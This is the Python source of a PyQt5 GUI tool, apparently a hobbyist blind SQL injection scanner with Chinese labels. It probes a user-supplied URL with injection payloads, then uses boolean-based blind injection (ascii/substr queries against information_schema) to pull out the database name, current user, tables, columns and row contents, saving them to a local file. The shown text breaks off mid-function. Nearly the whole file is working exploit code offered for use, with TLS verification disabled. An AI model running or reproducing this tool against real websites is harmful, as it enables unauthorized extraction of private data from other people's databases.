# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'untitled.ui'
#
# Created by: PyQt5 UI code generator 5.13.2
#
# WARNING! All changes made in this file will be lost!

from multiprocessing import Process
from PyQt5 import QtCore, QtGui, QtWidgets
import requests
requests.packages.urllib3.disable_warnings()

class Ui_Form(object):
    table=""
    column=""

    def setupUi(self, Form):
        Form.setObjectName("Form")
        Form.resize(1125, 606)
        font = QtGui.QFont()
        font.setPointSize(15)
        font.setBold(False)
        font.setWeight(50)
        Form.setFont(font)
        self.burp = QtWidgets.QPushButton(Form)
        self.burp.setGeometry(QtCore.QRect(960, 10, 131, 41))
        font = QtGui.QFont()
        font.setBold(False)
        font.setWeight(50)
        self.burp.setFont(font)
        self.burp.setObjectName("burp")
        self.label = QtWidgets.QLabel(Form)
        self.label.setGeometry(QtCore.QRect(10, 10, 91, 41))
        font = QtGui.QFont()
        font.setPointSize(15)
        font.setBold(True)
        font.setWeight(75)
        self.label.setFont(font)
        self.label.setObjectName("label")
        self.urltext = QtWidgets.QTextEdit(Form)
        self.urltext.setGeometry(QtCore.QRect(110, 10, 831, 41))
        self.urltext.setObjectName("urltext")
        self.burp_tables = QtWidgets.QPushButton(Form)
        self.burp_tables.setEnabled(True)
        self.burp_tables.setGeometry(QtCore.QRect(10, 70, 201, 41))
        self.burp_tables.setObjectName("burp_tables")
        self.burp_tables.setEnabled(False)
        self.burp_columns = QtWidgets.QPushButton(Form)
        self.burp_columns.setGeometry(QtCore.QRect(260, 70, 201, 41))
        self.burp_columns.setObjectName("burp_columns")
        self.burp_columns.setEnabled(False)
        self.stop = QtWidgets.QPushButton(Form)
        self.stop.setGeometry(QtCore.QRect(960, 70, 131, 41))
        self.stop.setObjectName("stop")
        self.stop.setEnabled(False)
        self.burp_text = QtWidgets.QPushButton(Form)
        self.burp_text.setGeometry(QtCore.QRect(510, 70, 431, 41))
        self.burp_text.setObjectName("burp_text")
        self.burp_text.setEnabled(False)
        self.tablename = QtWidgets.QListWidget(Form)
        self.tablename.setGeometry(QtCore.QRect(10, 130, 201, 471))
        self.tablename.setObjectName("tablename")
        self.columnname = QtWidgets.QListWidget(Form)
        self.columnname.setGeometry(QtCore.QRect(260, 130, 201, 471))
        self.columnname.setObjectName("columnname")
        self.textline = QtWidgets.QTextEdit(Form)
        self.textline.setGeometry(QtCore.QRect(510, 130, 431, 471))
        self.textline.setObjectName("textline")
        self.label_2 = QtWidgets.QLabel(Form)
        self.label_2.setGeometry(QtCore.QRect(970, 140, 71, 41))
        font = QtGui.QFont()
        font.setPointSize(9)
        font.setBold(True)
        font.setWeight(75)
        self.label_2.setFont(font)
        self.label_2.setObjectName("label_2")
        self.label_3 = QtWidgets.QLabel(Form)
        self.label_3.setGeometry(QtCore.QRect(970, 220, 71, 41))
        font = QtGui.QFont()
        font.setPointSize(9)
        font.setBold(True)
        font.setWeight(75)
        self.label_3.setFont(font)
        self.label_3.setObjectName("label_3")
        self.label_4 = QtWidgets.QLabel(Form)
        self.label_4.setGeometry(QtCore.QRect(970, 320, 71, 41))
        font = QtGui.QFont()
        font.setPointSize(9)
        font.setBold(True)
        font.setWeight(75)
        self.label_4.setFont(font)
        self.label_4.setObjectName("label_4")
        self.databasename = QtWidgets.QLineEdit(Form)
        self.databasename.setGeometry(QtCore.QRect(970, 170, 121, 41))
        self.databasename.setObjectName("databasename")
        self.usertext = QtWidgets.QTextEdit(Form)
        self.usertext.setGeometry(QtCore.QRect(970, 350, 121, 41))
        self.usertext.setObjectName("usertext")
        self.intclass = QtWidgets.QRadioButton(Form)
        self.intclass.setGeometry(QtCore.QRect(970, 260, 89, 16))
        font = QtGui.QFont()
        font.setPointSize(9)
        self.intclass.setFont(font)
        self.intclass.setObjectName("intclass")
        self.strclass = QtWidgets.QRadioButton(Form)
        self.strclass.setGeometry(QtCore.QRect(970, 300, 89, 16))
        font = QtGui.QFont()
        font.setPointSize(9)
        self.strclass.setFont(font)
        self.strclass.setObjectName("strclass")
        self.starttext = QtWidgets.QTextEdit(Form)
        self.starttext.setGeometry(QtCore.QRect(970, 420, 121, 41))
        self.starttext.setObjectName("starttext")
        self.label_5 = QtWidgets.QLabel(Form)
        self.label_5.setGeometry(QtCore.QRect(970, 390, 71, 41))
        font = QtGui.QFont()
        font.setPointSize(9)
        font.setBold(True)
        font.setWeight(75)
        self.label_5.setFont(font)
        self.label_5.setObjectName("label_5")

        self.retranslateUi(Form)
        QtCore.QMetaObject.connectSlotsByName(Form)

        self.burp.clicked.connect(self.sql)
        self.burp_tables.clicked.connect(self.tables)
        self.burp_columns.clicked.connect(self.columns)
        self.burp_text.clicked.connect(self.textlines)
        self.tablename.itemClicked.connect(self.clicked)
        self.columnname.itemClicked.connect(self.clicked2)
        self.stop.clicked.connect(self.stops)

    def retranslateUi(self, Form):
        _translate = QtCore.QCoreApplication.translate
        Form.setWindowTitle(_translate("Form", "游魂制作-盲注 V1.0 QQ:657970252"))
        self.burp.setText(_translate("Form", "检测"))
        self.label.setText(_translate("Form", "注入连接"))
        self.burp_tables.setText(_translate("Form", "检测表段"))
        self.burp_columns.setText(_translate("Form", "检测列段"))
        self.stop.setText(_translate("Form", "停止"))
        self.burp_text.setText(_translate("Form", "检测内容"))
        self.label_2.setText(_translate("Form", "数据库名称"))
        self.label_3.setText(_translate("Form", "注入类型"))
        self.label_4.setText(_translate("Form", "当前用户"))
        self.intclass.setText(_translate("Form", "数字型"))
        self.strclass.setText(_translate("Form", "字符型"))
        self.label_5.setText(_translate("Form", "开始位置"))
        self.is_exit="false"
        self.starttext.setText(_translate("Form", "0"))



    def clicked(self, item):
        self.table=item.text()
        # QtWidgets.QMessageBox.information(self,"aa",self.table)
    def clicked2(self,item):
        self.column=item.text()
        # QtWidgets.QMessageBox.information(self,"bb",self.column)
    def stops(self):
        self.is_exit="true"


    def sql(self):
        self.burp.setText("正在检测")
        self.burp.setEnabled(False)
        # self.stop.setEnabled(True)
        url = self.urltext.toPlainText()
        https_url = url[0:8]
        http_url = url[0:7]
        if url == "" or len(url) < 21:
            QtWidgets.QMessageBox.information(self, "提示", "url不正确")
            self.burp.setEnabled(True)
            self.burp.setText("检测")
            return
        elif https_url != "https://" and https_url != "HTTPS://":
            if http_url != "http://" and http_url != "HTTP://":
                QtWidgets.QMessageBox.information(self, "提示", "url不正确,请在url地址前写入  HTTP://  或  HTTPS://")
                self.burp.setEnabled(True)
                self.burp.setText("检测")
                return
        # print(url)
        try:
            old_data = requests.get(url, verify=False).text
            pload = ['"', "'", "')", '")', "%df'", '%df"', "and 8=2"]
            id = 0
            for p in pload:
                purl = url + p
                nurl = url + "%20and%201=1"
                # print(nurl)
                odata = requests.get(nurl, verify=False).text
                new_data = requests.get(purl, verify=False).text
                # 判断原始数据长度和and 1=1之后的数据长度相等，并且原始数据长度不等于pload之后的长度，即认定为存在注入
                if (len(old_data) - len(odata)) < 20 and (len(old_data) - len(new_data)) > 20:
                    # id=1为数字型注入
                    id = 1
                else:
                    id = 0
            if id == 1:
                self.intclass.setChecked(True)
                self.burp_tables.setEnabled(True)
                self.burp_dataname()
                self.mysql_user()
                # 将注入点写入文件
                f = open("注入点信息.txt", 'a')
                f.write("注入点url：" + url + "可能存在数字型注入\n")
                f.close()
                # print(url + "可能存在数字型注入")
                QtWidgets.QMessageBox.information(self, "恭喜", "可以注入")
            else:
                QtWidgets.QMessageBox.information(self, "很遗憾", "不可以注入")
                # self.burp.setEnabled(True)
                # self.stop.setEnabled(False)
            # print(len(old_data))
            # print(len(odata))
            # print(len(new_data))
        except requests.exceptions.ConnectionError:
            QtWidgets.QMessageBox.information(self, "错误", "请输入正确url")
            # self.burp.setEnabled(True)
            # self.stop.setEnabled(False)
        self.burp.setText("检测")
        # self.stop.setEnabled(False)
        self.burp.setEnabled(True)
        return url
    def tables(self):
        # self.stop.setEnabled(True)
        url = self.urltext.toPlainText()
        old_data = requests.get(url, verify=False).text
        number = int(self.starttext.toPlainText())
        if number<0:
            number=0
        f = open('注入点信息.txt', 'a')
        f.write("表名：\n")
        f.close()
        # 第一层循环获取当前数据库有多少个表
        try:
            while True:
                # 这是一个空字符串，接收返回的临时数据
                tmpname = ""
                # 因为每次查询内容substr都要从第一位开始，所以每次循环结束后要给初始值
                num = 1
                # 这是一个空列表，接收返回数据
                # tablename = []
                poc = " and%20ascii(substr((select table_name from information_schema.tables where table_schema=database() limit " + str(
                    number) + ",1),1,1))>1"
                new_data = requests.get(url + poc, verify=False).text

                # 如果原始数据的长度和新数据的长度相等即认定为存在，即进入下一层循环
                if (len(old_data) - len(new_data)) < 20 and self.is_exit == "false":
                    # 这是第二次循环获取字符长度
                    while True:
                        poc = " and%20ascii(substr((select table_name from information_schema.tables where table_schema=database() limit " + str(
                            number) + ",1)," + str(num) + ",1))>1"
                        new_data = requests.get(url + poc, verify=False).text
                        # 如果原始数据长度和新数据的长度相等即认定为存在，进入下一层循环
                        if (len(old_data) - len(new_data)) < 20 and self.is_exit == "false":
                            # 判断ascii码的边界，指定进入哪个循环，减少计算时间
                            poc = " and%20ascii(substr((select table_name from information_schema.tables where table_schema=database() limit " + str(
                                number) + ",1)," + str(num) + ",1))<=57"
                            new1_data = requests.get(url + poc, verify=False).text
                            poc = " and%20ascii(substr((select table_name from information_schema.tables where table_schema=database() limit " + str(
                                number) + ",1)," + str(num) + ",1))<=90"
                            new2_data = requests.get(url + poc, verify=False).text
                            poc = " and%20ascii(substr((select table_name from information_schema.tables where table_schema=database() limit " + str(
                                number) + ",1)," + str(num) + ",1))<=96"
                            new3_data = requests.get(url + poc, verify=False).text
                            poc = " and%20ascii(substr((select table_name from information_schema.tables where table_schema=database() limit " + str(
                                number) + ",1)," + str(num) + ",1))<=128"
                            new4_data = requests.get(url + poc, verify=False).text
                            if (len(old_data) - len(new1_data)) < 20 and self.is_exit == "false":
                                # 这是第三层循环，获取内容
                                for i in range(48, 58):
                                    poc = " and%20ascii(substr((select table_name from information_schema.tables where table_schema=database() limit " + str(
                                        number) + ",1)," + str(num) + ",1))=" + str(i)
                                    new_data = requests.get(url + poc, verify=False).text
                                    # 如果原始数据长度和新数据的长度相等即认定为存在，将该字符追加到tmpname临时变量中，num + 1为获取下一个字符做准备并终止循环
                                    if (len(old_data) - len(new_data)) < 20 and self.is_exit == "false":
                                        tmpname += chr(i)
                                        # print(chr(i))
                                        num += 1
                                        break
                            elif (len(old_data) - len(new2_data)) < 20 and self.is_exit == "false":
                                # 这是第三层循环，获取内容
                                for i in range(64, 91):
                                    poc = " and%20ascii(substr((select table_name from information_schema.tables where table_schema=database() limit " + str(
                                        number) + ",1)," + str(num) + ",1))=" + str(i)
                                    new_data = requests.get(url + poc, verify=False).text
                                    # 如果原始数据长度和新数据的长度相等即认定为存在，将该字符追加到tmpname临时变量中，num + 1为获取下一个字符做准备并终止循环
                                    if (len(old_data) - len(new_data)) < 20 and self.is_exit == "false":
                                        tmpname += chr(i)
                                        # print(chr(i))
                                        num += 1
                                        break
                            elif (len(old_data) - len(new3_data)) < 20 and self.is_exit == "false":
                                for i in range(91, 97):
                                    poc = " and%20ascii(substr((select table_name from information_schema.tables where table_schema=database() limit " + str(
                                        number) + ",1)," + str(num) + ",1))=" + str(i)
                                    new_data = requests.get(url + poc, verify=False).text
                                    # 如果原始数据长度和新数据的长度相等即认定为存在，将该字符追加到tmpname临时变量中，num + 1为获取下一个字符做准备并终止循环
                                    if (len(old_data) - len(new_data)) < 20 and self.is_exit == "false":
                                        tmpname += chr(i)
                                        # print(chr(i))
                                        num += 1
                                        break
                            elif (len(old_data) - len(new4_data)) < 20 and self.is_exit == "false":
                                for i in range(97, 123):
                                    poc = " and%20ascii(substr((select table_name from information_schema.tables where table_schema=database() limit " + str(
                                        number) + ",1)," + str(num) + ",1))=" + str(i)
                                    new_data = requests.get(url + poc, verify=False).text
                                    # 如果原始数据长度和新数据的长度相等即认定为存在，将该字符追加到tmpname临时变量中，num + 1为获取下一个字符做准备并终止循环
                                    if (len(old_data) - len(new_data)) < 20 and self.is_exit == "false":
                                        tmpname += chr(i)
                                        # print(chr(i))
                                        num += 1
                                        break
                        else:
                            # print()
                            break
                    # 将tmpname中的临时数据保存到tablename的列表中存放，方便写入文件
                    # tablename.append(tmpname)
                    self.tablename.addItem(tmpname)
                    # 每次获取完一条数据后，+1为获取下一条数据做准备
                    number += 1
                    # 每次获取完一条数据后，将该条数据写入到文件中
                    f = open('注入点信息.txt', 'a')
                    f.write(tmpname+ "\n")
                    f.close()
                else:
                    break
            self.burp_columns.setEnabled(True)
            # print("检测完成！耗时：{:.2f}分".format((time.time() - starttime) / 60))
            self.is_exit = "false"
            # self.stop.setEnabled(False)
            QtWidgets.QMessageBox.information(self,"提示","检测完毕！")
            return
        except requests.exceptions.ConnectionError:
            QtWidgets.QMessageBox.information(self, "错误", "网站连接错误！")
            self.burp_columns.setEnabled(True)
            # self.stop.setEnabled(False)

    def columns(self):
        # self.stop.setEnabled(True)

        t = self.table
        if t=="":
            QtWidgets.QMessageBox.information(self,"错误","未选择表")
            return
        # QtWidgets.QMessageBox.information(self,"aa",t)
        hextables = ""
        for c in t:
            h = hex(ord(c)).replace("0x", '')
            hextables += h
        # print("0x" + t)
        tables = "0x" + hextables
        url = self.urltext.toPlainText()
        old_data = requests.get(url, verify=False).text
        # limit 起始值为0
        number = int(self.starttext.toPlainText())
        if number < 0:
            number = 0
        columnfile = open("注入点信息.txt", 'a')
        columnfile.write(t + "表中的列\n")
        columnfile.close()
        # 这是第一层循环，获取有多少条数据
        try:
            while True:
                # substr 起始值为1
                num = 1
                tmpname = ""
                # columnname = []
                poc = " and%20ascii(substr((select column_name from information_schema.columns where table_name=" + tables + " limit " + str(
                    number) + ",1),1,1))>1"
                new_data = requests.get(url + poc, verify=False).text
                # 如果原始数据长度和新数据的长度相等即认定为存在，进入下一层循环
                if (len(old_data) - len(new_data)) < 20 and self.is_exit == "false":
                    # 这是第二次循环，获取数据的长度
                    while True:
                        poc = " and%20ascii(substr((select column_name from information_schema.columns where table_name=" + tables + " limit " + str(
                            number) + ",1)," + str(num) + ",1))>1"
                        new_data = requests.get(url + poc, verify=False).text
                        # 如果原始数据长度和新数据的长度相等即认定为存在，进入下一层循环
                        if (len(old_data) - len(new_data)) < 20 and self.is_exit == "false":
                            # 判断ascii码的边界，指定进入哪个循环，减少计算时间
                            poc = " and%20ascii(substr((select column_name from information_schema.columns where table_name=" + tables + " limit " + str(
                                number) + ",1)," + str(num) + ",1))<=57"
                            new1_data = requests.get(url + poc, verify=False).text
                            poc = " and%20ascii(substr((select column_name from information_schema.columns where table_name=" + tables + " limit " + str(
                                number) + ",1)," + str(num) + ",1))<=90"
                            new2_data = requests.get(url + poc, verify=False).text
                            poc = " and%20ascii(substr((select column_name from information_schema.columns where table_name=" + tables + " limit " + str(
                                number) + ",1)," + str(num) + ",1))<=96"
                            new3_data = requests.get(url + poc, verify=False).text
                            poc = " and%20ascii(substr((select column_name from information_schema.columns where table_name=" + tables + " limit " + str(
                                number) + ",1)," + str(num) + ",1))<=128"
                            new4_data = requests.get(url + poc, verify=False).text
                            if (len(old_data) - len(new1_data)) < 20 and self.is_exit == "false":
                                # 这是第三层循环，获取内容
                                for i in range(46, 58):
                                    poc = " and%20ascii(substr((select column_name from information_schema.columns where table_name=" + tables + " limit " + str(
                                        number) + ",1)," + str(num) + ",1))=" + str(i)
                                    new_data = requests.get(url + poc, verify=False).text
                                    # 如果原始数据长度和新数据的长度相等即认定为存在，将该字符追加到tmpname临时变量中，num + 1为获取下一个字符做准备并终止循环
                                    if (len(old_data) - len(new_data)) < 20 and self.is_exit == "false":
                                        tmpname += chr(i)
                                        # print(chr(i), end='')
                                        num += 1
                                        break
                            elif (len(old_data) - len(new2_data)) < 20 and self.is_exit == "false":
                                # 这是第三层循环，获取内容
                                for i in range(64, 91):
                                    poc = " and%20ascii(substr((select column_name from information_schema.columns where table_name=" + tables + " limit " + str(
                                        number) + ",1)," + str(num) + ",1))=" + str(i)
                                    new_data = requests.get(url + poc, verify=False).text
                                    # 如果原始数据长度和新数据的长度相等即认定为存在，将该字符追加到tmpname临时变量中，num + 1为获取下一个字符做准备并终止循环
                                    if (len(old_data) - len(new_data)) < 20 and self.is_exit == "false":
                                        tmpname += chr(i)
                                        # print(chr(i), end='')
                                        num += 1
                                        break
                            elif (len(old_data) - len(new3_data)) < 20 and self.is_exit == "false":
                                for i in range(91, 97):
                                    poc = " and%20ascii(substr((select column_name from information_schema.columns where table_name=" + tables + " limit " + str(
                                        number) + ",1)," + str(num) + ",1))=" + str(i)
                                    new_data = requests.get(url + poc, verify=False).text
                                    # 如果原始数据长度和新数据的长度相等即认定为存在，将该字符追加到tmpname临时变量中，num + 1为获取下一个字符做准备并终止循环
                                    if (len(old_data) - len(new_data)) < 20 and self.is_exit == "false":
                                        tmpname += chr(i)
                                        # print(chr(i), end='')
                                        num += 1
                                        break
                            elif (len(old_data) - len(new4_data)) < 20 and self.is_exit == "false":
                                for i in range(97, 123):
                                    poc = " and%20ascii(substr((select column_name from information_schema.columns where table_name=" + tables + " limit " + str(
                                        number) + ",1)," + str(num) + ",1))=" + str(i)
                                    new_data = requests.get(url + poc, verify=False).text
                                    # 如果原始数据长度和新数据的长度相等即认定为存在，将该字符追加到tmpname临时变量中，num + 1为获取下一个字符做准备并终止循环
                                    if len(old_data) == len(new_data) and self.is_exit == "false":
                                        tmpname += chr(i)
                                        # print(chr(i), end='')
                                        num += 1
                                        break
                        else:
                            # print()
                            break
                    # 每次获取完一条数据后，substr +1为获取下一条数据做准备
                    number += 1
                    # 获取完数据后，将该条完整的数据添加到columnname列表中
                    self.columnname.addItem(tmpname)
                    # print(columnname[0]+"---wkr")
                    # 将columnname列表中的数据写入到文件中
                    columnfile = open("注入点信息.txt", 'a')
                    columnfile.write(tmpname+ "\n")
                    columnfile.close()
                else:
                    break
            # print("检测完成！耗时：{:.2f}分".format((time.time() - starttime) / 60))
            self.is_exit = "false"
            self.burp_text.setEnabled(True)
            # self.stop.setEnabled(False)
            QtWidgets.QMessageBox.information(self, "提示", "检测完毕！")
        except requests.exceptions.ConnectionError:
            QtWidgets.QMessageBox.information(self, "错误", "网站连接错误！")
            self.burp_text.setEnabled(True)
            # self.stop.setEnabled(False)
        return


    def textlines(self):
        # QtWidgets.QMessageBox.information(self,"1",self.urltext.toPlainText())
        # QtWidgets.QMessageBox.information(self, "1", self.table)
        # QtWidgets.QMessageBox.information(self, "1", self.column)
        # self.stop.setEnabled(True)
        url = self.urltext.toPlainText()
        old_data = requests.get(url, verify=False).text
        # limit 起始值为0
        number = int(self.starttext.toPlainText())
        if number<0:
            number=0
        # 第一层循环获取有多少条数据
        if self.table=="" or self.column=="":
            QtWidgets.QMessageBox.information(self,"错误","未选择列")
            return
        f = open('注入点信息.txt', 'a')
        f.write(self.table + "表中的" + self.column + "列的内容\n")
        f.close()
        try:
            while True:
                # 定义一个substr起始值为1
                num = 1
                tmptext = ""
                # 定义个空列表来接收返回的内容
                # text = []
                poc = "%20and%20ascii(substr((select%20" + self.column + "%20from%20" + self.table + "%20limit%20" + str(number) + ",1),1,1))>1"
                new_data = requests.get(url + poc, verify=False).text
                # print(new_data)
                # 判断与原页面数据长度是否相同
                if (len(old_data) - len(new_data)) < 20 and self.is_exit == "false":
                    # print(1)
                    # # 第二次循环获取内容的长度
                    while True:
                         poc = " and%20ascii(substr((select " + self.column + " from " + self.table + " limit " + str(number) + ",1)," + str(num) + ",1))>1"
                         new_data = requests.get(url + poc, verify=False).text
                        # print(number)
                        # print(num)
                        # 判断与原页面数据长度是否相同
                         if (len(old_data) - len(new_data)) < 20 and self.is_exit == "false":
                            # 判断ascii码的边界，指定进入哪个循环，减少计算时间
                             poc = " and%20ascii(substr((select " + self.column + " from " + self.table + " limit " + str(number) + ",1)," + str(num) + ",1))<=57"
                             new1_data = requests.get(url + poc, verify=False).text
                             poc = " and%20ascii(substr((select " + self.column + " from " + self.table + " limit " + str(number) + ",1)," + str(num) + ",1))<=90"
                             new2_data = requests.get(url + poc, verify=False).text
                             poc = " and%20ascii(substr((select " + self.column + " from " + self.table + " limit " + str(number) + ",1)," + str(num) + ",1))<=96"
                             new3_data = requests.get(url + poc, verify=False).text
                             poc = " and%20ascii(substr((select " + self.column + " from " + self.table + " limit " + str(number) + ",1)," + str(num) + ",1))<=128"
                             new4_data = requests.get(url + poc, verify=False).text
                             if (len(old_data) - len(new1_data)) < 20 and self.is_exit == "false":
                                # 这是第三层循环，获取内容
                                 for i in range(46, 58):
                                     poc = " and%20ascii(substr((select " + self.column + " from " + self.table + " limit " + str(number) + ",1)," + str(num) + ",1))=" + str(i)
                                     new_data = requests.get(url + poc, verify=False).text

                                    # 如果原始数据长度和新数据的长度相等即认定为存在，将该字符追加到tmpname临时变量中，num + 1为获取下一个字符做准备并终止循环
                                     if (len(old_data) - len(new_data)) < 20 and self.is_exit == "false":
                                         tmptext += chr(i)
                                        # print(chr(i), end='')
                                         num += 1
                                         break
                             elif (len(old_data) - len(new2_data)) < 20 and self.is_exit == "false":
                                # 这是第三层循环，获取内容
                                 for i in range(64, 91):
                                     poc = " and%20ascii(substr((select " + self.column + " from " + self.table + " limit " + str(
                                         number) + ",1)," + str(num) + ",1))=" + str(i)
                                     new_data = requests.get(url + poc, verify=False).text
                                    # 如果原始数据长度和新数据的长度相等即认定为存在，将该字符追加到tmpname临时变量中，num + 1为获取下一个字符做准备并终止循环
                                     if (len(old_data) - len(new_data)) < 20 and self.is_exit == "false":
                                         tmptext += chr(i)
                                        # print(chr(i), end='')
                                         num += 1
                                         break
                             elif (len(old_data) - len(new3_data)) < 20 and self.is_exit == "false":
                                 for i in range(91, 97):
                                     poc = " and%20ascii(substr((select " + self.column + " from " + self.table + " limit " + str(
                                         number) + ",1)," + str(num) + ",1))=" + str(i)
                                     new_data = requests.get(url + poc, verify=False).text
                                    # 如果原始数据长度和新数据的长度相等即认定为存在，将该字符追加到tmpname临时变量中，num + 1为获取下一个字符做准备并终止循环
                                     if (len(old_data) - len(new_data)) < 20 and self.is_exit == "false":
                                         tmptext += chr(i)
                                        # print(chr(i), end='')
                                         num += 1
                                         break
                             elif (len(old_data) - len(new4_data)) < 20 and self.is_exit == "false":
                                 for i in range(97, 123):
                                     poc = " and%20ascii(substr((select " + self.column + " from " + self.table + " limit " + str(
                                         number) + ",1)," + str(num) + ",1))=" + str(i)
                                     new_data = requests.get(url + poc, verify=False).text
                                    # 如果原始数据长度和新数据的长度相等即认定为存在，将该字符追加到tmpname临时变量中，num + 1为获取下一个字符做准备并终止循环
                                     if (len(old_data) - len(new_data)) < 20 and self.is_exit == "false":
                                         tmptext += chr(i)
                                        # print(chr(i), end='')
                                         num += 1
                                         break

                         else:
                            # print()
                             break
                    # 获取完当前条数数据后，number+1为获取下一条数据做准备
                    number += 1
                     # 将数据追加到text列表
                    self.textline.append(tmptext)
                    # print(text[0])

                    # 将列表数据写入文本中
                    f = open('注入点信息.txt', 'a')
                    f.write(tmptext + "\n")
                    f.close()
                else:
                    # 与原页面不同即认定为，没有当前条数的数据，即终止循环
                    break

            # print("检测完成！耗时：{:.2f}分".format((time.time() - starttime) / 60))
            self.is_exit = "false"
            # self.stop.setEnabled(False)
            QtWidgets.QMessageBox.information(self, "提示", "检测完毕！")
        except requests.exceptions.ConnectionError:
            QtWidgets.QMessageBox.information(self, "错误", "网站连接错误！")
            # self.stop.setEnabled(False)
        return
    def burp_dataname(self):
        url = self.urltext.toPlainText()
        # payload = ("1234567890qwertyuiopasdfghjklzxcvbnm_")
        dataname = ""
        old_data = requests.get(url, verify=False).text
        # num = burp_data_len(url)
        subnum = 1
        while True:
            # print(subnum)
            # tables=" and (select length(group_concat(table_name)) from information_schema.tables where table_schema='hackyl' limit 0,1 )> "+str(i)
            poc = " and%20ascii(substr(database()," + str(subnum) + ",1))>1"
            new_data = requests.get(url + poc, verify=False).text
            if (len(old_data) - len(new_data) < 20) and self.is_exit == "false":
                # 判断ascii码的边界，指定进入哪个循环，减少计算时间
                poc = " and%20ascii(substr(database()," + str(subnum) + ",1))<=57"
                new1_data = requests.get(url + poc, verify=False).text
                poc = " and%20ascii(substr(database()," + str(subnum) + ",1))<=90"
                new2_data = requests.get(url + poc, verify=False).text
                poc = " and%20ascii(substr(database()," + str(subnum) + ",1))<=96"
                new3_data = requests.get(url + poc, verify=False).text
                poc = " and%20ascii(substr(database()," + str(subnum) + ",1))<=128"
                new4_data = requests.get(url + poc, verify=False).text
                if (len(old_data) - len(new1_data)) < 20 and self.is_exit == "false":
                    # 这是第三层循环，获取内容
                    for i in range(48, 58):
                        poc = " and%20ascii(substr(database()," + str(subnum) + ",1))=" + str(i)
                        new_data = requests.get(url + poc, verify=False).text
                        # 如果原始数据长度和新数据的长度相等即认定为存在，将该字符追加到tmpname临时变量中，num + 1为获取下一个字符做准备并终止循环
                        if (len(old_data) - len(new_data)) < 20 and self.is_exit == "false":
                            dataname += chr(i)
                            # print(chr(i), end='')
                            # self.databasename.setText(dataname)
                            subnum += 1
                            break
                elif (len(old_data) - len(new2_data)) < 20 and self.is_exit == "false":
                    # 这是第三层循环，获取内容
                    for i in range(64, 91):
                        poc = " and%20ascii(substr(database()," + str(subnum) + ",1))=" + str(i)
                        new_data = requests.get(url + poc, verify=False).text
                        # 如果原始数据长度和新数据的长度相等即认定为存在，将该字符追加到tmpname临时变量中，num + 1为获取下一个字符做准备并终止循环
                        if (len(old_data) - len(new_data)) < 20 and self.is_exit == "false":
                            dataname += chr(i)
                            # print(chr(i), end='')
                            # self.databasename.setText(dataname)
                            subnum += 1
                            break
                elif (len(old_data) - len(new3_data)) < 20 and self.is_exit == "false":
                    for i in range(91, 97):
                        poc = " and%20ascii(substr(database()," + str(subnum) + ",1))=" + str(i)
                        new_data = requests.get(url + poc, verify=False).text
                        # 如果原始数据长度和新数据的长度相等即认定为存在，将该字符追加到tmpname临时变量中，num + 1为获取下一个字符做准备并终止循环
                        if (len(old_data) - len(new_data)) < 20 and self.is_exit == "false":
                            dataname += chr(i)
                            # print(chr(i), end='')
                            # self.databasename.setText(dataname)
                            subnum += 1
                            break
                elif (len(old_data) - len(new4_data)) < 20 and self.is_exit == "false":
                    for i in range(97, 123):
                        poc = " and%20ascii(substr(database()," + str(subnum) + ",1))=" + str(i)
                        new_data = requests.get(url + poc, verify=False).text
                        # 如果原始数据长度和新数据的长度相等即认定为存在，将该字符追加到tmpname临时变量中，num + 1为获取下一个字符做准备并终止循环
                        if (len(old_data) - len(new_data)) < 20 and self.is_exit == "false":
                            dataname += chr(i)
                            # print(chr(i), end='')
                            # self.databasename.setText(dataname)
                            subnum += 1
                            break
                self.databasename.setText(dataname)
            else:
                break
        # print()
        # 将数据库名写入文件
        f = open("注入点信息.txt", 'a')
        f.write("数据库名称：" + dataname + "\n")
        f.close()
        # print("检测完成！耗时：{:.2f}分".format((time.time() - starttime) / 60))
        is_exit = "false"
        return dataname
    def mysql_user(self):
        url = self.urltext.toPlainText()
        # payload = ("1234567890qwertyuiopasdfghjklzxcvbnm_")
        username = ""
        old_data = requests.get(url, verify=False).text
        # num = burp_data_len(url)
        subnum = 1
        while True:
            # print(subnum)
            # tables=" and (select length(group_concat(table_name)) from information_schema.tables where table_schema='hackyl' limit 0,1 )> "+str(i)
            poc = " and%20ascii(substr(user()," + str(subnum) + ",1))>1"
            new_data = requests.get(url + poc, verify=False).text
            if (len(old_data) - len(new_data) < 20) and self.is_exit == "false":
                # 判断ascii码的边界，指定进入哪个循环，减少计算时间
                poc = " and%20ascii(substr(user()," + str(subnum) + ",1))<=57"
                new1_data = requests.get(url + poc, verify=False).text
                poc = " and%20ascii(substr(user()," + str(subnum) + ",1))<=91"
                new2_data = requests.get(url + poc, verify=False).text
                poc = " and%20ascii(substr(user()," + str(subnum) + ",1))<=96"
                new3_data = requests.get(url + poc, verify=False).text
                poc = " and%20ascii(substr(user()," + str(subnum) + ",1))<=128"
                new4_data = requests.get(url + poc, verify=False).text
                if (len(old_data) - len(new1_data)) < 20 and self.is_exit == "false":
                    # 这是第三层循环，获取内容
                    for i in range(48, 58):
                        poc = " and%20ascii(substr(user()," + str(subnum) + ",1))=" + str(i)
                        new_data = requests.get(url + poc, verify=False).text
                        # 如果原始数据长度和新数据的长度相等即认定为存在，将该字符追加到tmpname临时变量中，num + 1为获取下一个字符做准备并终止循环
                        if (len(old_data) - len(new_data)) < 20 and self.is_exit == "false":
                            username += chr(i)
                            # print(chr(i), end='')
                            # self.usertext.setText(username)
                            subnum += 1
                            break
                elif (len(old_data) - len(new2_data)) < 20 and self.is_exit == "false":
                    # 这是第三层循环，获取内容
                    for i in range(64, 91):
                        poc = " and%20ascii(substr(user()," + str(subnum) + ",1))=" + str(i)
                        new_data = requests.get(url + poc, verify=False).text
                        # 如果原始数据长度和新数据的长度相等即认定为存在，将该字符追加到tmpname临时变量中，num + 1为获取下一个字符做准备并终止循环
                        if (len(old_data) - len(new_data)) < 20 and self.is_exit == "false":
                            username += chr(i)
                            # print(chr(i), end='')
                            # self.usertext.setText(username)
                            subnum += 1
                            break
                elif (len(old_data) - len(new3_data)) < 20 and self.is_exit == "false":
                    for i in range(91, 97):
                        poc = " and%20ascii(substr(user()," + str(subnum) + ",1))=" + str(i)
                        new_data = requests.get(url + poc, verify=False).text
                        # 如果原始数据长度和新数据的长度相等即认定为存在，将该字符追加到tmpname临时变量中，num + 1为获取下一个字符做准备并终止循环
                        if (len(old_data) - len(new_data)) < 20 and self.is_exit == "false":
                            username += chr(i)
                            # print(chr(i), end='')
                            # self.usertext.setText(username)
                            subnum += 1
                            break
                elif (len(old_data) - len(new4_data)) < 20 and self.is_exit == "false":
                    for i in range(97, 123):
